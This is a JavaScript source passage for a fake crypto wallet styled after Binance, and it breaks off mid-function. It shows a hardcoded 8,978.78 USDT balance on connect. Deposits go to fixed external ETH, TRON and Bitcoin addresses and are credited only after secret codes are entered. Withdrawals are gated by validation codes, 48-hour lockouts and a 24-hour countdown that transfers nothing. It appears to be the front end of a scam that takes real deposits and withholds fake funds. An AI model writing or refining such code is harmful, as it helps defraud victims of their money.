        // Initial App State Structure (will be loaded from localStorage)
        let appState = {
            isConnected: false,
            userID: '',
            walletAddress: '0x97fe2864e38d0a667fc4daf9b2a4ed3e97ca1168',
            balances: {
                totalUSD: 0.00,
                tradeUSD: 0.00,
                lastKnownTotalUSD: 0.00, // For calculating change percentage
            },
            heldTokens: [
                // { symbol: 'USDT', id: 'tether', image: '...', balance: 8978.78 }
            ],
            activities: [], // Transaction and status updates
            currentPage: 'home',
            withdrawalCountdownEnd: 0, // Timestamp for 24-hour countdown end
            withdrawalSuspensionEnd: 0, // Timestamp for 48-hour suspension end
            withdrawalAttempts: 0,
            notificationOn: true,
            lastNotificationTime: 0, // Timestamp for last daily banner display
            depositAttempts: {}, // { code: lastUsedTimestamp }
            withdrawalAttempts: {} // { code: lastUsedTimestamp }
        };

        // Cache for Hot Coins
        let hotCoinsCache = [];

        /**
         * Loads state from localStorage or initializes default state.
         */
        function loadState() {
            const savedState = localStorage.getItem(APP_STATE_KEY);
            if (savedState) {
                const loaded = JSON.parse(savedState);
                // Merge loaded state with defaults to ensure all keys exist
                appState = { ...appState, ...loaded };

                // Handle token data which might be missing live price/image
                if (appState.heldTokens.length > 0 && !appState.heldTokens[0].image) {
                     // Default USDT token if not loaded correctly
                    if (appState.heldTokens.length === 1 && appState.heldTokens[0].symbol === 'USDT') {
                        appState.heldTokens[0].image = 'https://assets.coingecko.com/coins/images/325/small/Tether-logo.png?1598003707';
                        appState.heldTokens[0].id = 'tether';
                    }
                }

                console.log("State loaded:", appState);
            } else {
                console.log("No state found, initializing new state.");
                appState.userID = '9437137866';
            }
        }

        /**
         * Saves current app state to localStorage.
         */
        function saveState() {
            localStorage.setItem(APP_STATE_KEY, JSON.stringify(appState));
        }

        /**
         * Utility function for simulating async operations.
         */
        function waitFor(ms) {
            return new Promise(resolve => setTimeout(resolve, ms));
        }

        /**
         * Utility function to show error/success message in a modal.
         */
        function showMessage(title, message, type = 'info', addTokenInfo = null) {
            const modal = document.getElementById('dailyPopUpNotification');
            const modalTitle = document.getElementById('dailyPopUpTitle');
            const modalMessage = document.getElementById('dailyPopUpBody');
            const addTokenBtn = document.getElementById('dailyPopUpAddTokenBtn');

            modalTitle.textContent = title;
            modalMessage.innerHTML = message;
            modalTitle.className = `text-xl font-bold ${type === 'error' ? 'text-danger' : type === 'success' ? 'text-success' : 'text-yellow-400'}`;

            addTokenBtn.onclick = () => {
                if (addTokenInfo) {
                    addSelectedTokenToHoldings(addTokenInfo);
                }
                hideModal('dailyPopUpNotification');
            };

            if (addTokenInfo) {
                addTokenBtn.classList.remove('hidden');
            } else {
                addTokenBtn.classList.add('hidden');
            }

            modal.classList.remove('hidden', 'items-end');
            modal.classList.add('flex', 'items-center');
            document.querySelector('#dailyPopUpNotification .modal-content').classList.remove('translate-y-full');
        }

        /**
         * General modal/popup handler.
         */
        function showModal(title, message) {
            document.getElementById('modalTitle').textContent = title;
            document.getElementById('modalMessage').textContent = message;
            document.getElementById('globalModal').classList.remove('hidden');
            document.getElementById('globalModal').classList.add('flex');
        }

        function hideModal(id) {
            const modal = document.getElementById(id);
            if (modal) {
                modal.classList.remove('flex');
                modal.classList.add('hidden');
                // For bottom modals like withdrawalSelector, reset transform
                if (id === 'withdrawalSelector') {
                    document.querySelector(`#${id} .modal-content`).classList.add('translate-y-full');
                }
            }
        }

        function showLoading(message) {
            document.getElementById('loadingMessage').textContent = message;
            document.getElementById('globalLoading').classList.remove('hidden');
            document.getElementById('globalLoading').classList.add('flex');
        }

        function hideLoading() {
            document.getElementById('globalLoading').classList.remove('flex');
            document.getElementById('globalLoading').classList.add('hidden');
        }

        // =======================================================
        // 2. NAVIGATION & UI UPDATES
        // =======================================================

        /**
         * Handles page navigation and updates footer/header.
         */
        function showPage(pageId) {
            if (pageId === 'home' && appState.currentPage === 'withdrawalDetailsPage' && isSuspended()) {
                // If suspended, allow going home but keep suspension warning active
            } else if (pageId !== 'home' && isSuspended()) {
                showMessage('Access Denied', 'Withdrawal is suspended for 48 hours due to too many failed attempts.', 'error');
                return;
            }

            // Hide all pages
            document.querySelectorAll('.page').forEach(page => page.classList.add('hidden'));

            // Show the requested page
            const page = document.getElementById(pageId);
            if (page) {
                page.classList.remove('hidden');
                appState.currentPage = pageId;
            } else {
                console.error(`Page ID '${pageId}' not found.`);
                return;
            }

            // Update Header Title
            const titleMap = {
                'home': 'Web3 Wallet',
                'market': 'Market',
                'trade': 'Trade',
                'account': 'Account',
                'notification': 'Notifications',
                'search': 'Search',
                'chat': 'Support Chat',
                'withdrawalDetailsPage': 'Withdrawal',
                'withdrawalConfirmationPage': 'Withdrawal',
                'withdrawalProcessingPage': 'Withdrawal',
                'depositCoinSelectionPage': 'Select Coin',
                'depositNetworkPage': 'Select Network',
                'depositAddressPage': 'Deposit Address',
                'depositConfirmPage': 'Confirm Deposit',
                'accountDetails': 'Account Details',
                'googleAuthVerification': 'Secure Account',
            };
            document.getElementById('pageTitle').textContent = titleMap[pageId] || 'Binance';

            // Update Footer Nav
            document.querySelectorAll('.footer-nav .nav-item').forEach(item => {
                item.classList.remove('active');
                if (item.getAttribute('data-page') === pageId) {
                    item.classList.add('active');
                }
            });

            // Specific page initialization
            if (pageId === 'home') updateHomeDashboard();
            if (pageId === 'market') loadMarketData();
            if (pageId === 'trade') initTradingView('tradeChartContainer', 'BTCUSDT');
            if (pageId === 'account') updateAccountPage();
            if (pageId === 'notification') updateNotificationPage();
            if (pageId === 'depositCoinSelectionPage') loadDepositCoins();
            if (pageId === 'search') document.getElementById('globalSearchInput').value = '';
            if (pageId === 'accountDetails') updateAccountDetailsPage();
            if (pageId === 'googleAuthVerification') updateGoogleAuthPage();

            saveState(); // Persist current page

            // Ensure we stay on the correct withdrawal page if one is active
            if (appState.withdrawalCountdownEnd > Date.now()) {
                if (pageId !== 'withdrawalProcessingPage') {
                    // Force redirect back to processing page if countdown is active
                    showPage('withdrawalProcessingPage');
                }
            } else if (isSuspended()) {
                 if (pageId === 'withdrawalDetailsPage') {
                    document.getElementById('withdrawalDetailsPage').classList.remove('hidden');
                    document.getElementById('suspensionWarning').classList.remove('hidden');
                }
            }

            // If the user is navigating away from a form, clear errors
            if (pageId !== 'withdrawalConfirmationPage') document.getElementById('withdrawalCodeError').classList.add('hidden');
            if (pageId !== 'depositConfirmPage') document.getElementById('depositCodeError').classList.add('hidden');
        }

        /**
         * Updates all dynamic UI elements on the homepage.
         */
        async function updateUI() {
            // Header Button
            const connectBtn = document.getElementById('connectWalletBtn');
            connectBtn.textContent = appState.isConnected ? 'Connected' : 'Connect Wallet';
            connectBtn.className = `text-sm px-3 py-1 rounded-full font-medium transition-all duration-300 ${appState.isConnected ? 'bg-success text-white' : 'bg-yellow-400 text-black'}`;

            // Homepage UI
            document.getElementById('userIDDisplay').textContent = appState.isConnected ? appState.userID : '---';

            // Total Balance
            const totalBalance = appState.balances.totalUSD.toFixed(2);
            document.getElementById('totalBalanceDisplay').innerHTML = `
                <span class="text-text">$${appState.isConnected ? totalBalance : '0.00'}</span>
                <span id="balanceChange" class="text-sm ml-2 ${appState.balances.tradeUSD >= appState.balances.lastKnownTotalUSD ? 'text-success' : 'text-danger'}">
                    ${appState.isConnected ? ((appState.balances.totalUSD - appState.balances.lastKnownTotalUSD) / appState.balances.lastKnownTotalUSD * 100).toFixed(2) + '%' : ''}
                </span>
            `;

            // Holdings List
            renderHoldings();

            // Activity Section
            renderActivitySection();

            // Update all page-specific UI fields
            updateAccountPage();
            updateAccountDetailsPage();
        }

        /**
         * Renders the Holdings section on the homepage.
         */
        async function renderHoldings() {
            const holdingsList = document.getElementById('holdingsList');
            if (!appState.isConnected || appState.heldTokens.length === 0) {
                holdingsList.innerHTML = `<p class="text-muted text-sm text-center py-4">Connect wallet to see holdings.</p>`;
                return;
            }

            let html = '';
            try {
                // Fetch live prices for held tokens
                const ids = appState.heldTokens.map(t => t.id).join(',');
                const response = await fetch(`${COINGECKO_API}/simple/price?ids=${ids}&vs_currencies=usd`);
                if (!response.ok) throw new Error('Failed to fetch token prices.');
                const prices = await response.json();

                appState.heldTokens.forEach(token => {
                    const priceData = prices[token.id];
                    const currentPrice = priceData ? priceData.usd : 'N/A';
                    const value = token.balance * (currentPrice === 'N/A' ? 1 : currentPrice);

                    html += `
                        <div class="flex items-center justify-between bg-surface p-3 rounded-lg border border-gray-800">
                            <div class="flex items-center space-x-3">
                                <img src="${token.image}" onerror="this.onerror=null;this.src='https://placehold.co/32x32/1f2937/ffffff?text=${token.symbol.substring(0,2).toUpperCase()}'" class="w-8 h-8 rounded-full" />
                                <div>
                                    <p class="font-semibold">${token.symbol.toUpperCase()}</p>
                                    <p class="text-xs text-muted">$${currentPrice !== 'N/A' ? currentPrice.toFixed(4) : 'N/A'} USD</p>
                                </div>
                            </div>
                            <div class="text-right">
                                <p class="font-semibold">$${value.toFixed(2)}</p>
                                <p class="text-xs text-muted">${token.balance.toFixed(4)} ${token.symbol.toUpperCase()}</p>
                            </div>
                        </div>
                    `;
                });
            } catch (e) {
                console.error('Error fetching token prices:', e);
                html = `<p class="text-danger text-sm text-center py-4">Error loading live token data. ${appState.heldTokens.map(t => `$${t.balance.toFixed(2)} ${t.symbol.toUpperCase()}`).join(', ')}</p>`;
            }

            holdingsList.innerHTML = html;
        }

        /**
         * Renders the Transactions & Activity section.
         */
        function renderActivitySection() {
            const activitySection = document.getElementById('activitySection');
            if (!appState.isConnected) {
                activitySection.innerHTML = `<p class="text-sm text-muted text-center">No recent activity.</p>`;
                return;
            }

            let html = '';
            const now = Date.now();

            // 1. Withdrawal Countdown Status
            if (appState.withdrawalCountdownEnd > now) {
                const remaining = appState.withdrawalCountdownEnd - now;
                const time = formatTime(remaining);
                html += `
                    <div class="bg-yellow-900/30 p-3 rounded-lg border border-yellow-700 text-sm">
                        <p class="font-semibold text-yellow-400">Withdrawal Processing</p>
                        <p class="text-xs text-muted">Amount: ${appState.activities.find(a => a.type === 'Withdrawal' && a.status === 'Processing')?.amount || '---'} USD</p>
                        <p class="text-xs text-muted">Time Remaining: <span id="activityCountdown">${time}</span></p>
                    </div>
                `;
            } else if (appState.withdrawalCountdownEnd > 0) {
                 // Withdrawal Successful (and not yet recorded as a successful activity)
                 const processingActivityIndex = appState.activities.findIndex(a => a.type === 'Withdrawal' && a.status === 'Processing');
                 if (processingActivityIndex !== -1) {
                     const procActivity = appState.activities[processingActivityIndex];
                     appState.activities[processingActivityIndex] = { ...procActivity, status: 'Success' };
                     appState.withdrawalCountdownEnd = 0; // Reset countdown
                     saveState();
                     showMessage('Withdrawal Successful!', `The withdrawal of $${procActivity.amount.toFixed(2)} USD has been successfully processed.`, 'success');
                 }
            }

            // 2. Withdrawal Suspension Status
            if (isSuspended()) {
                const remaining = appState.withdrawalSuspensionEnd - now;
                const time = formatTime(remaining);
                html += `
                    <div class="bg-danger/30 p-3 rounded-lg border border-danger text-sm">
                        <p class="font-semibold text-danger">Withdrawal Suspended (48h)</p>
                        <p class="text-xs text-muted">Withdrawal functions are locked due to failed attempts.</p>
                        <p class="text-xs text-muted">Time Remaining: <span id="suspensionActivityCountdown">${time}</span></p>
                    </div>
                `;
            } else if (appState.withdrawalSuspensionEnd > 0) {
                appState.withdrawalSuspensionEnd = 0; // Reset suspension
                saveState();
            }

            // 3. Activity Log
            appState.activities.sort((a, b) => new Date(b.date) - new Date(a.date));
            const activityHtml = appState.activities.map(a => {
                const color = a.status === 'Success' ? 'text-success' : a.status === 'Failed' || a.status === 'Suspended' ? 'text-danger' : 'text-yellow-400';
                return `
                    <div class="flex justify-between items-center text-sm">
                        <div>
                            <p class="font-medium">${a.type}</p>
                            <p class="text-xs text-muted">${new Date(a.date).toLocaleDateString()}</p>
                        </div>
                        <p class="${color} font-semibold">${a.status}</p>
                    </div>
                `;
            }).join('');

            html += activityHtml || `<p class="text-sm text-muted text-center">No recent activity.</p>`;
            activitySection.innerHTML = html;
        }

        // =======================================================
        // 3. CORE LOGIC (CONNECTION & COUNTDOWN)
        // =======================================================

        /**
         * Connect/Disconnect Wallet
         */
        async function toggleWalletConnection() {
            if (appState.isConnected) {
                // Disconnect logic
                appState.isConnected = false;
                appState.balances.totalUSD = 0.00;
                appState.balances.lastKnownTotalUSD = 0.00;
                appState.heldTokens = [];
                appState.activities = [];
                appState.currentPage = 'home';
                appState.withdrawalCountdownEnd = 0;
                appState.withdrawalSuspensionEnd = 0;
                showMessage('Wallet Disconnected', 'You have successfully disconnected your Web3 Wallet.', 'info');
                saveState();
                updateUI();
                showPage('home');
                return;
            }

            // Connect logic
            showLoading('Connecting Web3 Wallet...');
            await waitFor(15000); // 15-second connection delay

            // Check if already connected during the delay (user might have refreshed)
            if (appState.isConnected) {
                hideLoading();
                showMessage('Already Connected', 'Wallet is already connected and state is persistent.', 'info');
                return;
            }

            appState.isConnected = true;
            appState.balances.lastKnownTotalUSD = 0.00; // Reset for percentage calc on first connection
            appState.balances.totalUSD = 8978.78;
            appState.heldTokens = [
                { symbol: 'USDT', id: 'tether', image: 'https://assets.coingecko.com/coins/images/325/small/Tether-logo.png?1598003707', balance: 8978.78 }
            ];

            saveState();
            updateUI();
            hideLoading();
            showMessage('Connection Successful!', 'Your wallet is now connected. Your Account ID has been generated. Don\'t forget to use the **Save Account** button in the notification pop-up.', 'success');
        }

        /**
         * Countdown functions (Withdrawal and Suspension).
         */
        function formatTime(ms) {
            const totalSeconds = Math.floor(ms / 1000);
            const hours = Math.floor(totalSeconds / 3600);
            const minutes = Math.floor((totalSeconds % 3600) / 60);
            const seconds = totalSeconds % 60;
            return `${String(hours).padStart(2, '0')}:${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
        }

        function isSuspended() {
            return appState.withdrawalSuspensionEnd > Date.now();
        }

        function checkCountdownAndSuspension() {
            const now = Date.now();

            // Check Withdrawal Countdown
            if (appState.withdrawalCountdownEnd > now) {
                const remaining = appState.withdrawalCountdownEnd - now;
                const time = formatTime(remaining);
                const procCountdown = document.getElementById('processingCountdown');
                const activityCountdown = document.getElementById('activityCountdown');

                if (procCountdown) procCountdown.textContent = time;
                if (activityCountdown) activityCountdown.textContent = time;

                // Ensure processing page is shown if countdown is active
                if (appState.currentPage !== 'withdrawalProcessingPage') {
                    // Check if the user is on a main page or if they refreshed
                    const onMainPage = ['home', 'market', 'trade', 'account'].includes(appState.currentPage);
                    if (onMainPage) {
                        renderActivitySection(); // Update activity for homepage persistence
                    } else if (document.getElementById(appState.currentPage).classList.contains('hidden')) {
                        // If the user refreshed and a non-main page was active, force to processing page
                        showPage('withdrawalProcessingPage');
                    }
                }

            } else if (appState.withdrawalCountdownEnd > 0) {
                // Countdown finished!
                appState.balances.lastKnownTotalUSD = appState.balances.totalUSD; // Prepare for percentage calculation
                const processingActivityIndex = appState.activities.findIndex(a => a.type === 'Withdrawal' && a.status === 'Processing');
                let withdrawnAmount = 0;

                if (processingActivityIndex !== -1) {
                    const procActivity = appState.activities[processingActivityIndex];
                    withdrawnAmount = procActivity.amount;
                    appState.activities[processingActivityIndex] = { ...procActivity, status: 'Success', date: new Date().toISOString() };
                    appState.balances.totalUSD -= withdrawnAmount; // Deduct amount
                }

                appState.withdrawalCountdownEnd = 0;
                saveState();
                updateUI();
                showMessage('Withdrawal Successful!', `The withdrawal of $${withdrawnAmount.toFixed(2)} USD has been successfully processed and deducted from your balance.`, 'success');
                renderActivitySection(); // Rerender activity without countdown
            }

            // Check Suspension Countdown
            if (appState.withdrawalSuspensionEnd > now) {
                const remaining = appState.withdrawalSuspensionEnd - now;
                const time = formatTime(remaining);
                const suspensionActivityCountdown = document.getElementById('suspensionActivityCountdown');
                if (suspensionActivityCountdown) suspensionActivityCountdown.textContent = time;

                const suspensionWarning = document.getElementById('suspensionWarning');
                if (appState.currentPage === 'withdrawalDetailsPage' && suspensionWarning) {
                    suspensionWarning.classList.remove('hidden');
                }
                renderActivitySection(); // Update activity section with suspension status
            } else if (appState.withdrawalSuspensionEnd > 0) {
                // Suspension finished!
                appState.withdrawalSuspensionEnd = 0;
                appState.withdrawalAttempts = 0;
                saveState();
                updateUI();
                const suspensionWarning = document.getElementById('suspensionWarning');
                if (suspensionWarning) suspensionWarning.classList.add('hidden');
                showMessage('Suspension Lifted', 'Your withdrawal functions have been restored. Please proceed with caution.', 'success');
            }
        }

        // =======================================================
        // 4. DEPOSIT LOGIC (Fully Updated & Working)
        // =======================================================
        let selectedDepositCoin = null;
        let currentDeposit = {};
        let allCoins = [];
        const DEPOSIT_CODES = ["4k2915", "93y472", "158i03", "7649k1", "50u319", "847l61", "31k586", "672h50", "24j391", "9y5836", "73a258", "62h047", "580y24", "417i02", "89h351", "264h98", "152j83", "309u72", "741o26", "58u320", "62w583", "958j10", "203i74", "7429u5", "894j21", "510f93", "6734o0", "248h65", "90c632", "43j892"];
        const DEPOSIT_NETWORKS = {
            USDT: ['Ethereum', 'Tron', 'BSC'],
            BTC: ['Bitcoin'],
            ETH: ['Ethereum'],
            BNB: ['BNB Smart Chain'],
            TRX: ['Tron']
        };
        const DEPOSIT_ADDRESSES = {
            'ETHEREUM': '0xB36EDa1ffC696FFba07D4Be5cd249FE5E0118130',
            'TRON': 'TSt7yoNwGYRbtMMfkSAHE6dPs1cd9rxcco',
            'BSC': '0xB36EDa1ffC696FFba07D4Be5cd249FE5E0118130',
            'BITCOIN': 'bc1qv4fffwt8ux3k33n2dms5cdvuh6suc0gtfevxzu'
        };

        function openDepositCoinSelection() {
             if (!appState.isConnected) {
                showMessage('Wallet Required', 'Please connect your Web3 Wallet to perform a deposit.', 'error');
                return;
            }
            showPage('depositCoinSelectionPage');
        }

        async function loadDepositCoins() {
            const depositCoinList = document.getElementById('depositCoinList');
            if (!depositCoinList) return;
            depositCoinList.innerHTML = `<p class="text-center text-gray-400 py-4">Loading coins...</p>`;
            try {
                if (allCoins.length === 0) {
                    const response = await fetch(`${COINGECKO_API}/coins/markets?vs_currency=usd&order=market_cap_desc&per_page=200&page=1&sparkline=false`);
                    if (!response.ok) throw new Error('Failed to fetch deposit coins');
                    allCoins = await response.json();
                }
                allCoins.sort((a, b) => a.symbol.localeCompare(b.symbol)); // Sort A–Z
                renderDepositCoinList(allCoins);
            } catch (error) {
                console.error("Error loading deposit coins:", error);
                depositCoinList.innerHTML = `<p class="text-center text-danger py-4">Failed to load coins. Please try again later.</p>`;
            }

            const searchInput = document.getElementById('depositSearch');
            if (searchInput) {
                searchInput.oninput = (e) => {
                    const searchTerm = e.target.value.trim().toLowerCase();
                    if (!searchTerm) {
                        renderDepositCoinList(allCoins);
                        return;
                    }
                    const filtered = allCoins.filter(
                        c => c.name.toLowerCase().includes(searchTerm) || c.symbol.toLowerCase().includes(searchTerm)
                    );
                    renderDepositCoinList(filtered);
                };
            }
        }

        function renderDepositCoinList(coins) {
            const container = document.getElementById('depositCoinList');
            if (!container) return;

            if (!coins || coins.length === 0) {
                container.innerHTML = `<p class="text-center text-gray-400 py-4">No matching coins found.</p>`;
                return;
            }

            let html = '';
            coins.forEach(coin => {
                html += `
                    <div class="deposit-coin-item flex items-center justify-between p-3 bg-gray-900 rounded-lg border border-gray-800 hover:bg-gray-800 cursor-pointer"
                        data-symbol="${coin.symbol.toUpperCase()}"
                        data-name="${coin.name}"
                        data-id="${coin.id}"
                        data-image="${coin.image}">
                        <div class="flex items-center gap-3">
                            <img src="${coin.image}" class="w-8 h-8 rounded-full"
                                onerror="this.onerror=null;this.src='https://placehold.co/32x32/1f2937/ffffff?text=${coin.symbol.substring(0,2).toUpperCase()}'" />
                            <div>
                                <p class="font-semibold">${coin.symbol.toUpperCase()}</p>
                                <p class="text-xs text-gray-400">${coin.name}</p>
                            </div>
                        </div>
                        <svg class="w-5 h-5 text-yellow-400" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M9 5l7 7-7 7" />
                        </svg>
                    </div>
                `;
            });

            container.innerHTML = html;

            document.querySelectorAll('.deposit-coin-item').forEach(item => {
                item.onclick = () => {
                    const symbol = item.dataset.symbol;
                    const image = item.dataset.image;
                    const id = item.dataset.id;
                    selectDepositCoin(symbol, image, id);
                };
            });
        }

        function selectDepositCoin(symbol, image, id) {
            selectedDepositCoin = { symbol, image, id };
            document.getElementById('depositCoinName').textContent = symbol;
            renderNetworkSelection(symbol);
            showPage('depositNetworkPage');
        }

        function renderNetworkSelection(coinSymbol) {
            const container = document.getElementById('networkSelectionList');
            if (!container) return;

            const networks = DEPOSIT_NETWORKS[coinSymbol] || (coinSymbol === 'USDT' ? DEPOSIT_NETWORKS['USDT'] : ['Ethereum']);
            container.innerHTML = networks.map(network => `
                <button class="network-select-btn w-full flex items-center py-4 px-5 bg-gray-900 border border-gray-700 rounded-xl hover:bg-gray-800 transition"
                        data-network="${network}">
                    <span class="text-md font-semibold">${network}</span>
                    <svg class="w-5 h-5 ml-auto text-yellow-400" xmlns="http://www.w3.org/2000/svg" fill="none"
                        viewBox="0 0 24 24" stroke="currentColor">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M9 5l7 7-7 7" />
                    </svg>
                </button>
            `).join('');

            document.querySelectorAll('.network-select-btn').forEach(btn => {
                btn.onclick = () => {
                    const network = btn.dataset.network;
                    openDepositAddressPage(selectedDepositCoin.symbol, network);
                };
            });
        }

        function openDepositAddressPage(symbol, network) {
            const networkKey = network.replace(/ /g, '').toUpperCase();
            const address = DEPOSIT_ADDRESSES[networkKey];

            if (!address) {
                showMessage('Error', `No deposit address found for ${symbol} on ${network}.`, 'error');
                return;
            }

            currentDeposit = { coin: symbol, network, address, id: selectedDepositCoin.id, image: selectedDepositCoin.image };

            document.getElementById('depositNetworkHeader').textContent = network;
            document.getElementById('depositAddressDisplay').textContent = address;
            document.getElementById('depositAddressCoinSymbol').textContent = symbol;

            const qrContainer = document.getElementById('qrcode');
            qrContainer.innerHTML = '';
            new QRCode(qrContainer, {
                text: address,
                width: 160,
                height: 160,
                colorDark: "#000000",
                colorLight: "#ffffff",
                correctLevel: QRCode.CorrectLevel.H
            });

            // Prepare for next step, using deposit confirm page for amount input
            const depositAmountInput = document.createElement('input');
            depositAmountInput.type = 'number';
            depositAmountInput.id = 'depositAmountInput';
            depositAmountInput.placeholder = `Enter amount of ${symbol} to deposit...`;
            depositAmountInput.className = 'w-full p-3 rounded-lg bg-card border border-gray-700 focus:ring-yellow-500 focus:border-yellow-500 text-text mt-4';

            const depositNextBtn = document.createElement('button');
            depositNextBtn.textContent = 'Next';
            depositNextBtn.className = 'w-full btn-primary mt-4';
            depositNextBtn.onclick = showDepositConfirmationPage;

            // Simple hack to repurpose the address page for amount input before confirmation
            const depositAddressPage = document.getElementById('depositAddressPage');
            const existingInput = document.getElementById('depositAmountInput');
            const existingBtn = document.getElementById('depositNextBtn');
            if (existingInput) existingInput.remove();
            if (existingBtn) existingBtn.remove();
            depositAddressPage.append(depositAmountInput, depositNextBtn);

            showPage('depositAddressPage');
        }

        function copyDepositAddress() {
            const address = document.getElementById('depositAddressDisplay').textContent;
            if (!address) return;

            document.execCommand('copy'); // Fallback copy mechanism
            showMessage('Copied!', 'Address copied to clipboard successfully.', 'info');
        }

        function showDepositConfirmationPage() {
            const input = document.getElementById('depositAmountInput');
            const amount = parseFloat(input.value);

            if (isNaN(amount) || amount <= 0) {
                showMessage('Error', 'Please enter a valid deposit amount.', 'error');
                return;
            }
            currentDeposit.amount = amount;

            document.getElementById('depositConfirmAmount').textContent = amount.toFixed(2);
            document.getElementById('depositVerificationCode').value = '';
            document.getElementById('depositCodeError').classList.add('hidden');
            showPage('depositConfirmPage');
        }

        async function handleDepositConfirmation() {
            const codeInput = document.getElementById('depositVerificationCode');
            const code = codeInput.value.trim();
            const errorMsg = document.getElementById('depositCodeError');

            if (!code) {
                errorMsg.textContent = 'Enter your verification code.';
                errorMsg.classList.remove('hidden');
                return;
            }

            errorMsg.classList.add('hidden');
            showLoading('Processing deposit...');
            await waitFor(15000);

            const now = Date.now();

            // Check if code is already used (simulated)
            const lastUsed = appState.depositAttempts[code];
            if (lastUsed && now - lastUsed < (24 * 60 * 60 * 1000) * 2) { // Allow 2 uses per 48 hours for simulation
                hideLoading();
                errorMsg.textContent = 'This code has already been used within the last 48 hours.';
                errorMsg.classList.remove('hidden');
                return;
            }

            if (!DEPOSIT_CODES.includes(code)) {
                hideLoading();
                errorMsg.textContent = 'Invalid verification code.';
                errorMsg.classList.remove('hidden');
                return;
            }

            // Success logic
            appState.depositAttempts[code] = now; // Mark code as used
            appState.balances.lastKnownTotalUSD = appState.balances.totalUSD;
            appState.balances.totalUSD += currentDeposit.amount;

            // Add/update token balance
            const existingTokenIndex = appState.heldTokens.findIndex(t => t.symbol === currentDeposit.coin);
            if (existingTokenIndex !== -1) {
                appState.heldTokens[existingTokenIndex].balance += currentDeposit.amount;
            } else {
                appState.heldTokens.push({
                    symbol: currentDeposit.coin,
                    id: currentDeposit.id,
                    image: currentDeposit.image,
                    balance: currentDeposit.amount
                });
            }

            appState.activities.unshift({
                type: 'Deposit',
                desc: `Deposited ${currentDeposit.amount.toFixed(2)} ${currentDeposit.coin} via ${currentDeposit.network}.`,
                date: new Date().toISOString(),
                status: 'Success',
                amount: currentDeposit.amount
            });

            saveState();
            hideLoading();
            updateUI();

            // Show success modal with Add Token button (though token is already added/updated)
            showMessage('Deposit Successful', `Successfully deposited ${currentDeposit.amount.toFixed(2)} ${currentDeposit.coin}. The token has been added to your holdings.`, 'success');
            showPage('home');
        }

        // =======================================================
        // 5. WITHDRAWAL LOGIC (Fully Updated & Working)
        // =======================================================
        let currentWithdrawal = { address: '', network: '', amount: 0, coin: 'USDT' };

        function showWithdrawalSelector() {
            if (!appState.isConnected) {
                showMessage('Wallet Required', 'Please connect your Web3 Wallet to perform a withdrawal.', 'error');
                return;
            }
            if (isSuspended()) {
                showMessage('Withdrawal Suspended', `Withdrawal functions are locked. Remaining time: ${formatTime(appState.withdrawalSuspensionEnd - Date.now())}`, 'error');
                return;
            }
            document.getElementById('withdrawalSelector').classList.remove('hidden');
            document.querySelector('#withdrawalSelector .modal-content').classList.remove('translate-y-full');
            document.querySelector('#withdrawalSelector .modal-content').classList.add('translate-y-0');
        }

        function showWithdrawalDetailsPage() {
            hideModal('withdrawalSelector');
            document.getElementById('suspensionWarning').classList.add('hidden'); // Hide suspension warning initially
            if (isSuspended()) {
                 document.getElementById('suspensionWarning').classList.remove('hidden');
                 document.getElementById('withdrawBtn').disabled = true;
            } else {
                 document.getElementById('withdrawBtn').disabled = false;
            }
            showPage('withdrawalDetailsPage');
        }

        function fillFromConnectedWallet() {
            document.getElementById('withdrawalAddress').value = appState.walletAddress;
        }

        function fillMaxAmount() {
            const usdtToken = appState.heldTokens.find(t => t.symbol === 'USDT');
            const maxAmount = usdtToken ? usdtToken.balance : appState.balances.totalUSD;
            document.getElementById('withdrawalAmount').value = maxAmount.toFixed(2);
        }

        function showWithdrawalConfirmationPage() {
            const address = document.getElementById('withdrawalAddress').value.trim();
            const network = document.getElementById('withdrawalNetwork').value;
            const amountInput = document.getElementById('withdrawalAmount');
            const amount = parseFloat(amountInput.value);

            if (isSuspended()) {
                showMessage('Suspended', 'Withdrawal is currently suspended.', 'error');
                return;
            }
            if (!address || !network || isNaN(amount) || amount <= 0 || amount > appState.balances.totalUSD) {
                showMessage('Invalid Details', 'Please enter a valid address, select a network, and ensure the amount is valid and less than your total balance.', 'error');
                return;
            }

            currentWithdrawal = { address, network, amount, coin: 'USDT' };

            document.getElementById('confirmAmount').textContent = `$${amount.toFixed(2)} USD`;
            document.getElementById('withdrawalValidationCode').value = '';
            document.getElementById('withdrawalCodeError').classList.add('hidden');
            showPage('withdrawalConfirmationPage');
        }

        async function handleWithdrawalConfirmation() {
            const codeInput = document.getElementById('withdrawalValidationCode');
            const code = codeInput.value.trim();
            const errorMsg = document.getElementById('withdrawalCodeError');
            const now = Date.now();

            if (!code) {
                errorMsg.textContent = 'Enter your validation code.';
                errorMsg.classList.remove('hidden');
                return;
            }

            errorMsg.classList.add('hidden');
            showLoading('Verifying code...');
            await waitFor(15000); // 15-second loading

            // Check if code is already used
            const lastUsed = appState.withdrawalAttempts[code];
            if (lastUsed && now - lastUsed < (24 * 60 * 60 * 1000) * 2) {
                appState.withdrawalAttempts.failedCount = (appState.withdrawalAttempts.failedCount || 0) + 1;
                saveState();
                hideLoading();
                errorMsg.textContent = 'Code already used within the last 48 hours.';
                errorMsg.classList.remove('hidden');
                handleFailedAttempt(errorMsg);
                return;
            }

            if (!VALID_WITHDRAW_CODES.includes(code)) {
                appState.withdrawalAttempts.failedCount = (appState.withdrawalAttempts.failedCount || 0) + 1;
                saveState();
                hideLoading();
                errorMsg.textContent = 'Validation failed. Please enter the correct code.';
                errorMsg.classList.remove('hidden');
                handleFailedAttempt(errorMsg);
                return;
            }

            // SUCCESS LOGIC: Start 24-hour countdown
            appState.withdrawalAttempts = { failedCount: 0 }; // Reset attempts
            appState.withdrawalAttempts[code] = now; // Mark code as used
            appState.withdrawalCountdownEnd = now + (24 * 60 * 60 * 1000); // 24 hours
            appState.activities.unshift({
                type: 'Withdrawal',
                desc: `Withdrawal of ${currentWithdrawal.amount.toFixed(2)} ${currentWithdrawal.coin} initiated.`,
                date: new Date().toISOString(),
                status: 'Processing',
                address: currentWithdrawal.address,
                network: currentWithdrawal.network,
                amount: currentWithdrawal.amount
            });
            saveState();
            hideLoading();
            showWithdrawalProcessingPage();
        }

        function handleFailedAttempt(errorMsg) {
            const failedCount = appState.withdrawalAttempts.failedCount;

            if (failedCount >= 5) {
